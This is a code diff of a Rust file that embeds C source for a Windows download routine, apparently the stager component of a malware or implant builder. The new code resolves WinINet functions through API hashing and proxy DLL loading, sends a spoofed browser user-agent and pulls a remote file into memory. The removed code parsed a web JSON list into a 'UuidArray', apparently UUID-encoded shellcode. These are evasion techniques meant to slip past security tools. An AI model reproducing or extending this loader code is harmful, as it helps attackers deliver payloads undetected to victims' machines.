@@ -1,43 +1,93 @@
-pub const WEB_C: &str = r#"
-#include <stdio.h>
-#include <string.h>
+pub const WEB_C: &str = r#"#include "web.h"
+#include "macros.h"
+#include "winapi.h"
 #include <windows.h>
-#include <wininet.h>
 
-#include "../include/cJSON.h"
+#define INTERNET_OPEN_TYPE_PRECONFIG 0
+#define INTERNET_OPEN_TYPE_DIRECT 1
+#define INTERNET_OPEN_TYPE_PROXY 3
+#define INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY 4
+#define INTERNET_FLAG_RELOAD 0x80000000
 
-VOID DownloadFromUrl(IN LPCWSTR url, OUT PBYTE pFileContent,
-                     IN SIZE_T DownloadLength) {
-    HINTERNET hInternet = NULL;
-    HINTERNET hInternetFile = NULL;
-    PDWORD NumberOfBytesRead = 0;
+FARPROC pInternetOpenA;
+FARPROC pInternetOpenUrlA;
+FARPROC pInternetReadFile;
+FARPROC pInternetCloseHandle;
 
-    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
-    hInternetFile = InternetOpenUrlW(
-        hInternet, url, NULL, NULL,
-        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-
-    InternetReadFile(hInternetFile, pFileContent, DownloadLength,
-                     &NumberOfBytesRead);
-    // clean up
-    InternetCloseHandle(hInternet);
-    InternetSetOptionW(hInternet, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-}
-
-VOID ParseJsonObject(IN PBYTE WebBuffer, OUT char *UuidArray[]) {
-    cJSON *root = cJSON_Parse(WebBuffer);
-    cJSON *Item = cJSON_GetObjectItem(root, "user_items");
-    printf("[i] Iteams Count: %d\n", cJSON_GetArraySize(Item));
-    for (int i = 0; i < cJSON_GetArraySize(Item); i++) {
-        printf("[i] Count: %d\n", i);
-        cJSON *subitem = cJSON_GetArrayItem(Item, i);
-        cJSON *users = cJSON_GetObjectItemCaseSensitive(subitem, "user_id");
-
-        if (cJSON_IsString(users) && (users->valuestring != NULL)) {
-            printf("\t[*] Users Value: %s\n", users->valuestring);
-            UuidArray[i] = users->valuestring;
-            // strncpy(UuidArray, users->valuestring, i);
-        }
+int Download(char *url, char **file, int *size) {
+    HMODULE hWininet = NULL;
+    if (!pInternetOpenA || !pInternetOpenUrlA || !pInternetReadFile ||
+        !pInternetCloseHandle) {
+        if (!ProxyDllLoad("wininet.dll")) return 0;
+        if ((hWininet = GetModuleHandleS(WININET_DLL_HASH)) == NULL) return 0;
+        pInternetOpenA = GetProcAddressS(hWininet, INTERNETOPENA_HASH);
+        pInternetOpenUrlA = GetProcAddressS(hWininet, INTERNETOPENURLA_HASH);
+        pInternetReadFile = GetProcAddressS(hWininet, INTERNETREADFILE_HASH);
+        pInternetCloseHandle =
+            GetProcAddressS(hWininet, INTERNETCLOSEHANDLE_HASH);
+#ifdef DEBUG
+        PRINTA("[i] InternetOpenA : %p\n", pInternetOpenA);
+        PRINTA("[i] InternetOpenUrlA : %p\n", pInternetOpenUrlA);
+        PRINTA("[i] InternetReadFile : %p\n", pInternetReadFile);
+        PRINTA("[i] InternetCloseHandle : %p\n", pInternetCloseHandle);
+#endif
+        if (!pInternetOpenA || !pInternetOpenUrlA || !pInternetReadFile ||
+            !pInternetCloseHandle)
+            return 0;
     }
+#ifdef PROXY
+    HINTERNET net = CALL(
+        (InternetOpenA)(pInternetOpenA),
+        "Mozilla/6.6 (Windows NT 6.6; WOW64) AppleWebKit/666.66 (KHTML, like "
+        "Gecko) Chrome/66.0.6666.666 Safari/666.66",
+        INTERNET_OPEN_TYPE_PROXY, PROXY_STRING, NULL, 0);
+#else
+    HINTERNET net = CALL(
+        (InternetOpenA)(pInternetOpenA),
+        "Mozilla/6.6 (Windows NT 6.6; WOW64) AppleWebKit/666.66 (KHTML, like "
+        "Gecko) Chrome/66.0.6666.666 Safari/666.66",
+        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+#endif
+
+    if (net == NULL) goto __cleanup;
+    HINTERNET connection =
+        CALL((pInternetOpenUrlA), net, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+
+    if (connection == NULL) goto __cleanup;
+
+    int read = 0, reading = 0;
+    char *flash, *buffer = NULL;
+    *size = 0;
+
+    if ((flash = (char *)malloc(1024)) == NULL) goto __cleanup;
+
+    while (1) {
+
+        if (!CALL((InternetReadFile)(pInternetReadFile), connection, flash,
+                  1024, (LPDWORD)&reading))
+            goto __cleanup;
+
+        *size += reading;
+
+        if (buffer == NULL)
+            buffer = (char *)malloc(reading);
+        else
+            buffer = (char *)realloc(buffer, *size);
+
+        if (!buffer) goto __cleanup;
+
+        memcpy(buffer + (*size - reading), flash, reading);
+        memset(flash, 0x00, reading);
+
+        if (reading < 1024) break;
+    }
+    *file = buffer;
+__cleanup:
+    if (connection)
+        CALL((InternetCloseHandle)(pInternetCloseHandle), connection);
+    if (net) CALL((pInternetCloseHandle), net);
+    free(flash);
+    return (buffer != NULL) ? 1 : 0;
 }
+
 "#;
